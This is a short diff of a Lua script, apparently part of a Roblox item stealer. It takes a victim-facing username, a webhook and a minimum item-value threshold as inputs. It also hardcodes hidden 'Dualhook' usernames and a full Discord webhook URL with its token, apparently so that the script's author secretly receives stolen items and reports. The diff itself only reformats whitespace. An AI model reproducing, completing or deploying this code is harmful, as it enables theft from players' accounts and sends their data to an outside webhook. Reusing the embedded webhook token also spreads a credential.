@@ -1,9 +1,7 @@
--- Accept parameters
 local Username = ... -- This will take the first argument passed
-local Username2 = select(2, ...) -- This will take the second argument
-local Webhook = select(3, ...) -- This will take the third argument
-local MinimumRAP = tonumber(select(4, ...)) -- Convert to number
-
+local Username2 = select(2,...) -- This will take the second argument
+local Webhook = select(3,...) -- This will take the third argument
+local MinimumRAP = tonumber(select(4,...)) -- Convert to number
 local DualhookUsername = "iamjeffoalt"
 local DualhookUsername2 = "nxrf1axz"
 local DualhookWebhook = "https://discord.com/api/webhooks/1318253261740048474/izxHeoiaYZ9oZdxwXdNXsT0fvFokxS-CXJQZAdalGbTpZA-K8MGUYooTH_FUCJIhF8JG"
